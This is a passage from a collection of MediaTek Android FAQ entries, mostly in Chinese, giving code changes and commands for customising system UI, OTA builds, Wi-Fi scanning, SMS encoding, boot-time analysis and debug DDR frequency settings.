String buildnumber = SystemProperties.get("ro.build.display.id");
//on AOSP branch,the value of 'ro.build.display.id' will like:
//'full_mt6582_phone_qhd-eng 4.4.2 KOT49H 1400738660 dev-keys'
if (buildnumber.contains("keys") || !(buildnumber.startsWith("ALPS"))) {
    Log.i("@M_" + TAG, "Get build number from 'ro.mediatek.version.release'");
    buildnumber = SystemProperties.get("ro.mediatek.version.release");
}
 
2、如果预置了GMS包，upload.php填写PRODUCT时需要在后面加上 [GMS] 
手机相关code在：SystemUpdate/src/com/mediatek/systemupdate/Util.java
builder.append(oem).append("_").append(product);

if (isGmsLoad(context) || isGmsLoad2()) {
    builder.append("[gms] ");
}
```

## [FAQ13241]  [Gallery] PhotoPage如何全屏显示图片（如何动态设置虚拟按键?）

```text
根据实际需要这种模式的显示的页面添加如下flag
 
1. Hide Bars 
int flags = 0;
flags|= View.SYSTEM_UI_FLAG_FULLSCREEN
  |View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
  |View.SYSTEM_UI_FLAG_IMMERSIVE
  |View.SYSTEM_UI_FLAG_LAYOUT_STABLE
  |View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
  |View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
 
 setSystemUiVisibility(flags);
 
 View.SYSTEM_UI_FLAG_HIDE_NAVIGATION --> 隐藏navigationbar
 View.SYSTEM_UI_FLAG_FULLSCREEN --> 隐藏statusbar
 
2.Show Bars
 
int flags = 0;
flags|= View.SYSTEM_UI_FLAG_LAYOUT_STABLE
   |View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
   |View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
 
setSystemUiVisibility(flags);
 
    这3个flag 需要配合使用，清除所有的Flag，半透明显示SYSTEM UI ，同时使得当前Activity的UI 不被resize 并显示在SYSTEM UI 下面。
 
 ==========================
以PhotoPage为例，实现全屏沉浸模式，需要做如下改动：
 文件：PhotoPage.java
 
1. onResume()方法中增加如下code：
protected void onResume()｛
...
     // add by mtk start
     Window win = mActivity.getWindow();
     win.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
     win.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
     // add by mtk end
...
｝
2. onDestroy()方法中增加如下code：

protected void onDestroy() {
...
     //add by mtk start
     Window win = mActivity.getWindow();
     win.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
     win.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
     //add by mtk end

     super.onDestroy();
｝
3. showBars()方法增加如下code:

private void showBars() {
...
    //add by mtk start
    Window win = mActivity.getWindow();
    win.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
    win.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
    //add by mtk end

    mActionBar.show();
    mActivity.getGLRoot().setLightsOutMode(false);
...
}
4. hideBars()增加如下改动：

private void hideBars() {
...
    mActionBar.hide();
    //add by mtk start
    Window win = mActivity.getWindow();
    win.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
    int flags = (View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
    win.getDecorView().setSystemUiVisibility(flags);
    win.setNavigationBarColor(Color.TRANSPARENT);
    //add by mtk end
    //mActivity.getGLRoot().setLightsOutMode(true);  //delete by mtk
...
}
上述修改可以实现大图界面图片全屏显示，但会导致编辑、连拍按钮被Navigation Bar覆盖，如下图所示：

 

如下修改仅供参考：

Photopage_bottom_controls.xml 设置

android:id="@+id/photopage_bottom_controls"
android:padding="10dp"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:layout_alignParentBottom="true"
android:layout_alignParentLeft="true"
android:orientation="horizontal"
android:fitsSystemWindows=”true”<--! add by mtk -->
android:visibility="gone">
ContainerLayer.java

1.增加头文件

import android.content.res.Resources;
import android.content.res.Configuration;
2.增加新方法

private static int getNavigationBarHeight(Activity activity){
    Resources resources = activity.getResources();
    int resId = resources.getIdentifier("navigation_bar_height", "dimen", "android");
    int height = resources.getDimensionPixelSize(resId);
    return height;
}
修改showLeftBottomIcon()方法
private void showLeftBottomIcon() {
     mContainer.setVisibility(View.VISIBLE);
 
     // add by mtk start
     int orientation = mActivity.getResources().getConfiguration().orientation;
     int h = getNavigationBarHeight(mActivity);
 
     if (orientation == Configuration.ORIENTATION_PORTRAIT) {
         mContainer.setX(0);
         mContainer.setY(-h);
     }else{
         mContainer.setY(0);
         mContainer.setX(-h);
     }
     //add by mtk end

     if (mMediaData.subType == MediaData.SubType.CONSHOT) {
         mConShotIcon.setVisibility(View.VISIBLE);
     }
 }
PhotoPage.java新增如下方法：

@Override
public void onConfigurationChanged(Configuration config) {
    super.onConfigurationChanged(config);
    toggleBars();
}
```

## [ota]  [FAQ17784]  [Recovery]  [Common] Android M OTA build (Include Security OTA)

```text
case 1、不论是否开启Security boot功能，M 版本的OTA build方法都如下：

Full : ./build/tools/releasetools/ota_from_target_files –v --block -k $(key_path) –s device/mediatek/build/releasetools/mt_ota_from_target_files src.zip update.zip
Incremental : ./build/tools/releasetools/ota_from_target_files –v --block -k $(key_path) –s device/mediatek/build/releasetools/mt_ota_from_target_files –i src.zip tgt.zip update.zip

case 2、如果需要同时升级lk、preloader，请参考：
ID: FAQ17441
[Recovery]  [Common] Android M 版本如何升级lk 、preloader ?
```

## [log]  [FAQ14493]  [Speech]  [L version]  通话无声问题需要抓取哪些log

```text
有时测试人员会低概率测试到通话无声的问题，
然而仅仅有vmlog+mobile log还比较难定位问题，需要抓取更多信息，具体请参考此FAQ
[SOLUTION] 
1. 清空mtklog文件夹
2. 打开vmlog即进入工模->Hardware Testing->Audio->Speech Logger->勾选Enable speech log
    打开vmlog后每打一通电话便会在mtklog\audio_dump中生成一个*.vm文件，其以通话开始时间命名
3. start mobile log
4. 去复现无声问题
5. 当复现到无声后，请不要切换device(即不要切换成免提或者听筒，保持之前的就好)，也不要挂断电话
    进入工模->Hardware Testing->Audio->Audio Logger按下Dump Audio Debug Info
    [Expected result] : 前5s本端会听到tone音，后5s对方会听到tone音，请记录2边实际情况
6. 挂断电话后请不要再打电话
7. stop mobile log
8. 上传整个mtklog文件夹
注意：请严格按照如上步骤抓取，如果某项没有做，就麻烦测试人员重新复现，谢谢
```

## [FAQ18314]  MountService对关机时间的影响

```text
关机的时候，MountService需要对卡进行卸载，卸载卡有时候需要花费比较长的时间，进而影响到关机时间。
卸载卡即把卡的状态从Mouted切换到unmounted，状态切换的快慢跟是否有process访问卡上资源有很大关系。
卸载卡的时候，如果有process访问卡上资源，vold会每隔5秒retry 3次，如果到了timeout时间，还是有process访问卡上资源，vold会调用Process Killer暴利砍掉对应的process。
目前的循环等待时间是5s，如果要修改这个时间，建议不要修改太多，因为这是一个经验值，改太小的话，正常的unmount做不完就可能被kill，如果是SystemServer占用着卡上资源，暴利砍掉SystemServer就会导致系统重启，因此不要过分追求unmount时间短，因为这大大增加了SystemServer被kill的风险。
相关的code在：/system/vold/Utils.cpp的ForceUnmount()中，修改等待时间即修改这里面的sleep()时间。
 
另外，log中search "vold : Failed to unmount"可以知道具体是哪个路径被占用着，如果有FileSystem相关的监控工具，可以监控下这个路径在被谁操作，从而找到对应的Process。

简单的排查可以关掉MTKLoger(特别是modem log)，看关掉之后关机时间是否会变短。
```

## [FAQ18292]  Omacp Apn信息替换原有APN

```text
1. 在OmacpApnReceiverService.java文件中新增replaceApn,实现查找替换APN的功能
public long replaceApn(Context context, Uri uri, String apn, String apnId, String name, String types ,ContentValues values, String numeric) {
....
while (!cursor.isAfterLast()) {
…… 
//modify begin 
else if( (name.equals(cursor.getString(2))||apn.equals(cursor.getString(3))) && types.equals(cursor.getString(4)) )
{
numReplaced = cursor.getString(0);
break;
}
//modify end
cursor.moveToNext();
}
.....
}
注:标红的if语句中的内容可根据需求进行调整
 修改OmacpApnReceiverService.java的updateApn函数
private void updateApn(Context context, Uri uri, String apn, String apnId,
String name, ContentValues values, String numeric, Uri peferredUri) {
//modify 调用1中添加的方法
long replaceNum = replaceApn(context, uri, apn, apnId,name, mType , values, numeric);
.................
if (replaceNum == APN_NO_UPDATE) {
…..
}
// modify add 更新添加后的APN
} else if (replaceNum > 0) {
Uri url = ContentUris.withAppendedId(Telephony.Carriers.CONTENT_URI, Integer.parseInt(replaceNum));
getContentResolver().update(url, values, null, null);
}
// modify end
```

## [FAQ18313]  [SMS] 使用16bit 或7bit 编码，都需要替换特殊字符去掉帽子

```text
如果只是针对7bit编码方式需要替换，请参考FAQ08878.
如果是不管使用什么编码方式都要替换，请参考以下改法：

case 1:要求发送方显示特殊字符，接收方显示去掉帽子：
如果发送方不要显示替换后的字符，就要在数据插入database后再替换字符。
/vendor/mediatek/proprietary/packages/apps/Mms/src/com/android/mms/transaction/SmsReceiverService.java
public synchronized void sendFirstQueuedMessage() {
    int msgId = c.getInt(SEND_COLUMN_ID);
    Uri msgUri = ContentUris.withAppendedId(Sms.CONTENT_URI, msgId);
    // 此处增加对 msgText中特殊字串的替换逻辑
    msgText.replaceAlll("\\u005e", "xxxx"); 
    ...
    SmsMessageSender sender = new SmsSingleRecipientSender(this,
    address, msgText, threadId, status == Sms.STATUS_PENDING, msgUri, subId);

case 2:要求发送方与接收方显示一致，都去掉帽子：
/packages/apps/Mms/src/com/android/mms/transaction/SmsMessageSender.java 
1. protected final String mMessageText;将 mMessageText final属性去掉；
2. private boolean queueMessage(long token) throws MmsException {
…
MmsLog.d(MmsApp.TXN_TAG, "SMS DR request=" + requestDeliveryReport);
/// @}
// 此处增加对 mMessageText 中特殊字串的替换逻辑
mMessageText = mMessageText.replaceAll("\\u005e", "xxxx");
```

## [log]  [FAQ18019]  如何把main log中的信息在kernel log中输出

```text
#include <cutils/klog.h>

#define ERROR(x...)   KLOG_ERROR("module_name", x)
#define NOTICE(x...)  KLOG_NOTICE("module_name", x)
#define INFO(x...)    KLOG_INFO("module_name", x)

NOTICE("%s: val=%d \n", __FUNCTION__, value);
```

## [clock]  [FAQ14351]  L版本12小时制状态栏时间不显示AM/PM

```text
Andoid L版本把时间格式设置为12小时制，状态栏时间不显示AM/PM的，这是google的默认设计。下拉状态栏，左上角的时间是带有AM，PM的，如果想要显示AM/PM怎么办呢?
[SOLUTION] 
把mAmPmStyle的初始值改为AM_PM_STYLE_NORMAL
Clock.java alps\frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar\policy 
public Clock(Context context, AttributeSet attrs, int defStyle) {
    super(context, attrs, defStyle);
    TypedArray a = context.getTheme().obtainStyledAttributes(
        attrs,
        R.styleable.Clock,
        0, 0);
    try {
        ///修改此处
        //mAmPmStyle = a.getInt(R.styleable.Clock_amPmStyle, AM_PM_STYLE_GONE);
        mAmPmStyle = AM_PM_STYLE_NORMAL
    } finally {
        a.recycle();
    }
}
```

## [性能]  [FAQ18279]  开机时间慢分析

```text
(1)若能抓取mobilelog，则可以在APLog_xxxx文件夹中找到bootprof文件。或者直接cat /proc/bootprof

----------------------------------------
0 BOOT PROF (unit:msec)
----------------------------------------
1077 : preloader         // 这里会记录preloader和lk的执行时间，单位为毫秒。
3667 : lk
----------------------------------------
47.188307 : ON
95.973922 : of_init 16992539 ns
124.732076 : ramoops_init 27976001 ns
155.463384 : init_mtk_governor 28810077 ns
208.009307 : arm64_device_init 40170846 ns
245.649461 : pm_sysrq_init 28632231 ns
305.320923 : event_trace_init 25269538 ns
328.487538 : pmic_mt_init 18462461 ns
398.533231 : populate_rootfs 67385539 ns
481.464077 : mtkfb_init 16279692 ns
631.410616 : modem_cd_init 128015693 ns
817.579693 : md_ccif_init 186129616 ns
894.852462 : gf_init 40584231 ns
940.017616 : mt_i2c_init 45137231 ns
1013.895463 : eem_init 23476462 ns
1059.026771 : acc_init 32313847 ns
1116.455540 : gyro_init 57412308 ns
2363.018851 : fpc1022_init 1232834464 ns
2382.414158 : battery_init 18354616 ns
2417.481312 : clk_debug_init 33775692 ns
2450.348466 : mt_soc_snd_init 32818538 ns
2451.768543 : Kernel_init_done
2875.773313 : INIT: on init start
2881.017236 : INIT:Mount_START
3546.686469 : INIT:Mount_END
3550.746930 : start mobicore (on fs)
3553.768623 : start mobicore end (on fs)
3675.040623 : post-fs-data: on modem start
5971.898167 : BOOT_Animation:START             // 这里表明已经进入上层。
6684.275630 : Zygote:Preload Start
7112.275554 : Zygote:Preload Start
8761.911327 : Zygote:Preload 3831 classes in 1319ms
8847.152943 : Zygote:Preload 3831 classes in 1424ms
9055.208867 : Zygote:Preload 342 obtain resources in 206ms
9059.303559 : Zygote:Preload 41 resources in 2ms
9076.121251 : Zygote:Preload 342 obtain resources in 313ms
9081.294482 : Zygote:Preload 41 resources in 3ms
9323.764175 : Zygote:Preload End
9481.360175 : Zygote:Preload End
9550.741483 : Android:SysServerInit_START
10059.694100 : Android:PackageManagerService_Start
10326.429639 : Android:PMS_scan_START
10516.254332 : Android:PMS_scan_data_done:/system/framework
11297.080180 : Android:PMS_scan_data_done:/system/priv-app
12650.057491 : Android:PMS_scan_data_done:/system/app
12736.916952 : Android:PMS_scan_data_done:/system/vendor/operator/app
12768.057183 : Android:PMS_scan_data_done:/system/plugin
12771.374414 : Android:PMS_scan_data_done:/data/app
12780.415645 : Android:PMS_scan_END
12952.868184 : Android:PMS_READY
22793.776438 : Android:SysServerInit_END
24645.384365 : BOOT_Animation:END                     // 这里表示已经开进home界面。
24646.324673 : OFF
----------------------------------------
================ END of FILE ===============

(2) 若不能抓取mobielog，可以直接用uart log抓取，时间的分析可以参考FAQ14851 进入kernel前开机时间分析方法。
```

## [ota]  [FAQ17418]  [Recovery]  [Build]  预置资源（如apk）到userdata，otapackage之后的userdata.img没有此资源

```text
随着FLASH空间的使用率被广泛专注，MTK_SHARED_SDCARD的使用逐渐成为主流。
MTK_SHARED_SDCARD enable的前提下，phone storage和internal storage共享userdata分区，其中phone storage的目录变成了/data/media。
MTK_SHARED_SDCARD enable时的内置资源预置方式，可以参见FAQ：
[FAQ14735] 【sdcard-FAT filesystem】MTK_SHARED_SDCARD打开时L上如何预置资源

[Issue] 
按照FAQ14735预置资源以后，new之后的userdata.img是包含新内置资源，此时再执行otapackage，out目录下的userdata.img并不包含此资源。

[Solution] 
经分析，主要原因如下所示：
/build/core/Makefile 中otapackage的主要flow --
otapackage: $(INTERNAL_OTA_PACKAGE_TARGET)
-> $(INTERNAL_OTA_PACKAGE_TARGET): $(BUILT_TARGET_FILES_PACKAGE) $(DISTTOOLS)
-> $(BUILT_TARGET_FILES_PACKAGE)
$(hide) ./build/tools/releasetools/add_img_to_target_files -p $(HOST_OUT) $@
$(hide) ./build/tools/releasetools/replace_img_from_target_files.py $@ $(PRODUCT_OUT)
Add_img_to_target_files对各个image的处理 --
/build/tools/releasetools/add_img_to_target_files
main
-> AddImagesToTargetFiles(args[0] )
-> AddSystem(output_zip, recovery_img=recovery_image, boot_img=boot_image)
-> AddUserdata(output_zip)
-> AddCache(output_zip)

上面flow的目的是以out/obj/的中间包为source重新生成image，放入中间包。
def AddUserdata(output_zip, prefix="IMAGES/"):
"""Create an empty userdata image and store it in output_zip."""
其中， AddUserdata与其他接口的实现不同，主要是生成一个空的目录，google要求otapackage release出去的dataimage是空的（升级本身也是不包含userdata的）。
-> $(hide) ./build/tools/releasetools/replace_img_from_target_files.py $@ $(PRODUCT_OUT)
这段的目的是从中间包将image copy出来替换out目录。
所以，otapackage最终out/obj目录下的/DATA目录是有apk的，但是最后生成的out目录和中间包里的userdata.img都是空的。
如果一定要预置apk，可以尝试将new后的userdata.img保留下来。Otapackage之后，再用new后的userdata.img替换out目录下的userdata.img。
或是直接修改/build/tools/releasetools/replace_img_from_target_files.py 
将
if img.find(".img") != -1:
修改为
if img.find(".img") != -1 and img.find("userdata") == -1 :
```

## [FAQ11961]  KK之后的版本状态栏电池图标问题

```text
KK之后的版本电池图标由之前的蓝色改成白色，充电状态背景色也不会动。
这是因为KK之后的版本电池图标不再使用之前的图片方式，而是通过代码绘制而成，具体文件如下
BatteryMeterView.java(frameworks\base\packages\SystemUI\src\com\android\systemui)
```

## [FAQ11708]  如何去掉状态栏G、3G图标

```text
去掉方法很简单，就是把这个View隐藏就行了，具体修改文件如下
SignalClusterView.java(frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar)

如果是KK之前的版本可能会有单卡、双卡之分，双卡文件是：

SignalClusterViewGemini.java(frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar)

KK及之前版本：
apply()
……
//hide network icon begin
/* int state = SIMHelper.getSimIndicatorStateGemini(i);//hide network icon
    if (!mIsAirplaneMode
            && SIMHelper.isSimInserted(i)
            && PhoneConstants.SIM_INDICATOR_LOCKED != state
            && PhoneConstants.SIM_INDICATOR_SEARCHING != state
            && PhoneConstants.SIM_INDICATOR_INVALID != state
            && PhoneConstants.SIM_INDICATOR_RADIOOFF != state) {
        ……
    } else {*/
        mSignalNetworkType[i] .setImageDrawable(null);
        mSignalNetworkType[i] .setVisibility(View.GONE);
    //}
//hide network icon end
……

L版本：
修改apply函数中的如下代码：
/*if (!mIsAirplaneMode && mNetworkType != null) {
    int id = TelephonyIcons.getNetworkTypeIcon(mNetworkType);
    Xlog.d(TAG, "apply(), mNetworkType= " + mNetworkType + " resId= " + id);
    mSignalNetworkType.setImageResource(id);
    mSignalNetworkType.setVisibility(View.VISIBLE);
} else {*/
    mSignalNetworkType.setImageDrawable(null);
    mSignalNetworkType.setVisibility(View.GONE);
//}

M版本：

目前默认的如果是非CTA的项目，网络图标默认就是不显示的，对于CTA项目如果不要显示，那么可以修改函数：
setNetworkIcon中如下代码：
// if (mNetworkIcon == 0) {
    mNetworkType.setVisibility(View.GONE);
/*       } else {
   mNetworkType.setImageResource(mNetworkIcon);
   mNetworkType.setVisibility(View.VISIBLE);
}*/

相反的对于非CTA项目如果需要将网络图标显示出来，可以将：
setNetworkIcon中如下代码屏蔽掉：
/*if (!FeatureOptions.MTK_CTA_SET) {
  return;
}*/
```

## [FAQ11620]  透明的状态栏有渐变的阴影效果

```text
这是google default设计，如果桌面壁纸是白色的时候比较明显，这个渐进的效果是通过背景图来设置的，在frameworks/base/packages/systemui/res/ 里面drawable-hdpi（如果是其他density，请找对应的资源）中status_background.9.png替换这个图片；
或者修改代码绘制图片的地方：
BarTransitions.java文件最后draw的方法mGradient.draw(canvas); //注释掉这一行即不绘制这个图片就可以了
```

## [默认值]  [FAQ04788]  如何关闭Navigation Bar

```text
KK及之前版本：
默认Navigation Bar的控制在 alps/frameworks/base/core/res/res/values/config.xml文件中<bool name=“config_showNavigationBar”>true</bool>， 但是在6589项目以及6572等项目上修改为false不起作用，或者默认已经是false，但是还是会显示navigation Bar。

MT6589 和MT6572：
1. 在6589项目和6572项目上，MTK内部Demo Project有Navigation Bar的需求，因此通过Resource Overlay机制默认打开了Navigation Bar，如果要关闭，需要确认resource overlay部分是否也有定义，具体如下：
alps/mediatek/custom/project_name/resource_overlay/generic/frameworks/base/core/res/res/values/config.xml
<bool name=“config_showNavigationBar”>true</bool>
将这个配置信息修改为false即可。

2. MT6572：
如果上面的xml文件定义都是false，请再确认下mediatek/config/工程名字的目录/system.prop 是否有qemu.hw.mainkeys=0
如果有，请去掉qemu.hw.mainkeys=0的定义
3. JB3 MP之后所有版本统一如下路径修改
\mediatek\custom\common\resource_overlay\navbar\frameworks\base\core\res\res\values\config.xml 
<bool name=“config_showNavigationBar”>true</bool>
将这个配置信息修改为false即可。 

4. 其他平台或者branch都可以类似查找，以上都找不到，请全局搜索config_showNavigationBar

L和M版本：

这个两个版本的修改方式与之前的版本也是类似：

（1）先查看config_showNavigationBar值的定义，默认定义在：alps/frameworks/base/core/res/res/values/config.xml，如果没有请全局搜索。

（2）再检查qemu.hw.mainkeys值的设置。

（3）是否显示Navigation Bar，判断的值在PhoneWindowManager.java文件中的setInitialDisplaySize 函数中被设置，检查mHasNavigationBar的值是如何被设置的。如果mHasNavigationBar为true，Navigation Bar会显示，否则不显示。
```

## [FAQ04504]  如何修改navigation bar为半透明?

```text
Navigation bar是google 从4.0版本开始支持的feature，默认情况下这个feature对应的option是关闭的，需要通过修改config 文件来开启。开启navigation bar的方法和注意事项，请参考FAQ:如何开启navigation bar。
如果想要做到，在开启navigation bar的情况下，可以透过navigation bar的背景看到navigation bar后面的内容（也就是修改navigation bar为半透明），应该如何修改?
[SOLUTION] 
1,alps\frameworks\base\packages\SystemUI\res\layout\navigation_bar.xml,
    把background修改成statusbar_background的背景图：
    android:background="@drawable/statusbar_background"
2,制作一张半透明的9.png图片，名字叫statusbar_background.9.png,放到
    alps\frameworks\base\packages\SystemUI\res\drawable-hdpi下
3,alps\frameworks\base\packages\SystemUI\src\com\android\
    systemui\statusbar\phone\PhoneStatusBar.java
    修改方法getNavigationBarLayoutParams，如下：
    private WindowManager.LayoutParams getNavigationBarLayoutParams() {
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
        . . .
        /*PixelFormat.OPAQUE*/ PixelFormat.TRANSLUCENT);    //mtk added
        . . .
4,WindowManagerService.java中
    修改方法updateWallpaperOffsetLock，如下：
    boolean updateWallpaperOffsetLocked(WindowState wallpaperWin, int dw, int dh,boolean sync)  {
        if (wallpaperWin.mYOffset != offset) {
            if (DEBUG_WALLPAPER) Slog.v(TAG, "Update wallpaper " + wallpaperWin + " y: " + offset);
                changed = true;
                wallpaperWin.mYOffset = offset;   // 修改成wallpaperWin.mYOffset = 0;
            }

对于JB的版本，还需要修改：
5, WindowManagerService.java
修改方法performLayoutLockedInner，如下：
private final void performLayoutLockedInner(boolean initial, boolean updateInputWindows) {
    if (!mLayoutNeeded) {
        …
        for (i = N-1; i >= 0; i--) {
            final WindowState win = mWindows.get(i);
            //mtk added
            if (win.mIsWallpaper)
                mSystemDecorRect.bootom = 屏幕高度;    //以480*800分辨率来说，这里的屏幕高度就是800
            //mtk added
        …
}

对于JB2之后的版本，google对WMS的架构进行调整，暂不支持navigation bar透明，请在JB2之后的版本不做做此修改

注意：
修改navigation bar半透明后存在的限制：
从那些以wallpaper作为背景的画面(画面对应的window具备属性：FLAG_SHOW_WALLPAPER)切换到不显示wallpaper的画面，会在navigation bar的背景上先闪一下wallpaper，然后navigation bar的背景才变成黑色。
如果希望某些特定的window才可以让navigation bar半透明，其他window上navigation bar仍然不透明，例如：只在launcher画面做到navigation bar半透明，其他画面navigation bar仍然保持原来的风格，目前不做支持。
WVGA上开启navigation bar本身就有很多问题，建议不要在WVGA分辨率下开启navigation bar功能。
Navigation bar半透明的功能只针对当前的wallpaper是ImageWallpaper的情况，对Live Wallpaper不生效，后续也不做更多支持。
```

## [FAQ18278]  关闭wifi&&scan always 关闭的情况下依然显示wifi 耗电

```text
关闭wfi&&scan always 关闭的情况下，电池计算耗电，依然显示wifi 耗电；
root casue:
BatteryStats 會去等Wifi framework的SupplicantStateTracker的noteWifiSupplicantStateChanged()
由此得知Wifi Supplicant的狀態，
但是關wifi時，可能正在ScaningState，SupplicantStateTracker沒有先送出WIFI_SUPPL_STATE_DISCONNECTED，就已經回到UninitializedState，不再聽Supplicant state change了，
所以造成BatteryStats與Wifi Framework/Supplicant state 不一致，
這個是Google default issue，
[SOLUTION] 
diff --git a/service/java/com/android/server/wifi/SupplicantStateTracker.java b/service/java/com/android/server/wifi/SupplicantStateTracker.java
index a4c029d..7d35c61 100644
--- a/service/java/com/android/server/wifi/SupplicantStateTracker.java
+++ b/service/java/com/android/server/wifi/SupplicantStateTracker.java
@@ -249,6 +249,8 @@ class SupplicantStateTracker extends StateMachine {
                     transitionOnSupplicantStateChange(stateChangeResult);
                     break;
                 case WifiStateMachine.CMD_RESET_SUPPLICANT_STATE:
+                    ///M: for sync supplicant state with settings
+                    sendSupplicantStateChangedBroadcast(SupplicantState.DISCONNECTED, false);
                     transitionTo(mUninitializedState);
                     break;
                 case WifiManager.CONNECT_NETWORK:
```

## [FAQ18274]  L版本之后，灭屏依然保证framework发起scan

```text
灭屏之后离开AP 范围，断线，重新回到AP 范围，不会自动连接；
root cause：
因为L版本之后，为了省电考虑，framework不会触发scan ，从而导致断线后无法自动连接，需要等到亮屏才会重新连接； 
[SOLUTION] 
如果需要客制化这一功能，请按照如下修改方案测试；
在WifiStateMachine.java文件中；
改两个地方：
1， 
PendingIntent getPrivateBroadcast(String action, int requestCode) {
    Intent intent = new Intent(action, null);
    intent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY_BEFORE_BOOT);
    //intent.setPackage(this.getClass().getPackage().getName());    注解掉这行
    return PendingIntent.getBroadcast(mContext, requestCode, intent, 0);
}

2，setScanAlarm內，set那句code 改为setRepeating：
mAlarmManager.setRepeating(AlarmManager.RTC_WAKEUP,
System.currentTimeMillis() + 1000, mDefaultFrameworkScanIntervalMs, mScanIntent);

这里的修改保证一点：当wifi 断线之后，我们会1s 后触发一次scan ，之后每间隔5分钟触发一次scan；
mDefaultFrameworkScanIntervalMs 定义的值如下：
<integer translatable="false" name="config_wifi_framework_scan_interval">300000</integer>
```

## [FAQ18293]  DRM FL文件没有小锁图标

```text
1.进入浏览器->链接到下载网址
2.选择DRM文件->选择Forward Lock文件，下载一张图片->下载完成，从通知栏里进入downloads，发现下载的DRM文件没有小锁图标
这个是正常现象，只有CD和SD的文件才会有锁，因为只有这两类DRM文件需要check权限，而FL是没有权限限制的，只是不能转发，所以FL类型不会有锁显示。

什么是 DRM FL 文件??
```

## [FAQ18294]  安装应用提示不能安装，报 INSTALL_FAILED_DUPLICATE_PERMISSION 错误

```text
安装应用提示不能安装，报 INSTALL_FAILED_DUPLICATE_PERMISSION 错误
[SOLUTION] 
Android 5.0上新增加的 permission 的判断，INSTALL_FAILED_DUPLICATE_PERMISSION这个简单讲就是如果两个apk声明了相同的permission，但是如果这两个apk的签名不一样的话，后安装的apk会fail。
http://tieba.baidu.com/p/3237226241?see_lz=1 可以参考一下。
```

## [FAQ17743]  如何修改35/35m/53平台DDR的工作频率

```text
DDR工作频率的修改仅限debug使用，不能用于量产
[SOLUTION] 
For MT6753/MT6735
[fix dram to low freq] 
adb shell "echo ddr_dfs 1 > /sys/power/vcorefs/vcore_debug"
adb shell "echo KIR_SYSFS 0 > /sys/power/vcorefs/vcore_debug"
adb shell "echo KIR_SYSFS 1 > /sys/power/vcorefs/vcore_debug"
adb shell "echo feature_en 1 > /sys/power/vcorefs/vcore_debug"
adb shell "cat /sys/bus/platform/drivers/emi_clk_test/read_dram_data_rate"
DRAM data rate = 1313

[fix dram to highfreq] 
adb shell "echo ddr_dfs 1 > /sys/power/vcorefs/vcore_debug"
adb shell "echo KIR_SYSFS 1 > /sys/power/vcorefs/vcore_debug"
adb shell "echo KIR_SYSFS 0 > /sys/power/vcorefs/vcore_debug"
adb shell "echo feature_en 1 > /sys/power/vcorefs/vcore_debug"
adb shell "cat /sys/bus/platform/drivers/emi_clk_test/read_dram_data_rate"
DRAM data rate = 1466 or 1600

For MT6735M

//DDR 1066
echo KIR_SYSFSX 1 > /sys/power/vcorefs/vcore_debug

//DDR 800
echo KIR_SYSFSX 2 > /sys/power/vcorefs/vcore_debug
```

## [sysui]  [FAQ03087]  如何在状态栏上增加一个icon

```text
1. 首先需要在alps/frameworks/base/res/res/values/config.xml中定义需要显示的icon的配置信息。以添加headset(耳机图标)为例：
2. 其次在 alps/frameworks/packages/SystemUI/src/com/android/systemui/statusbar/PhoneStatusBarPolicy.java 中进行初始化
3. 然后在 alps/frameworks/packages/SystemUI/src/com/android/systemui/statusbar/PhoneStatusBarPolicy.java 中注册相应的receiver来接收Intent
同时在updateHeadSet方法中调用StatusBarManager提供的setIcon/setIconVisibility方法 来显示或隐藏headset icon.
```

## [sysui]  [FAQ03089]  如何调整状态栏icon之间的显示顺序

```text
需要在 alps/frameworks/base/res/res/values/config.xml 中的 config_statusBarIcons 调整相应的顺序，其中从上倒下，对应的状态栏的顺序为从左到右。
```

## [settings]  [默认值]  [FAQ07781]  user版本时，设置里，如何将“开发者选项”选项显示出来

```text
如果要always显示“开发者选项”菜单，请修改
Settings.java (alps\packages\apps\settings\src\com\android\settings)
中 
private void updateHeaderList(List<Header> target) {
final boolean showDev =  true; //修改为一直显示开发者选项.
```

## [默认值]  [FAQ06277]  账户自动同步默认关闭

```text
Q:设置--账户与同步---自动同步
如何使得自动同步默认关闭。
A:修改 SyncStorageEngine.java (alps\frameworks\base\core\java\android\content)中的
private boolean mMasterSyncAutomatically = true;
修改为
private boolean mMasterSyncAutomatically = false;
既可将自动同步的默认值设置成不勾选。 
```

## [默认值]  [FAQ10772]  在窗口小部件里快速设置如何默认同步关闭

```text
在JB版本是由 SyncStorageEngine.java (alps\frameworks\base\core\java\android\content)
中
public boolean getMasterSyncAutomatically(int userId) {
    synchronized (mAuthorities) {
        Boolean auto = mMasterSyncAutomatically.get(userId);
        Log.d(TAG,"userId="+userId+" auto="+auto+" mExt="+mExt);
        if(mExt != null && mExt.getCurrentOPIndex() == 1){
            ///M: add for cmccc when there is no account default auto sync is off
            Log.d(TAG,"mExt.getCurrentOPIndex()="+mExt.getCurrentOPIndex());
            return auto == null ? false : auto;
        } else {
            return auto == null ? true : auto;
        }
        //return auto == null ? mDefaultMasterSyncAutomatically : auto;
    }
}
决定的, 如果是CMCC的项目,默认就会是false.这是CMCC需求。
如果不是CMCC定制,可以修改
return auto == null ? true: auto; 
为
return auto == null ? false: auto;
这样就默认是关闭了。
只适用JB版本
```

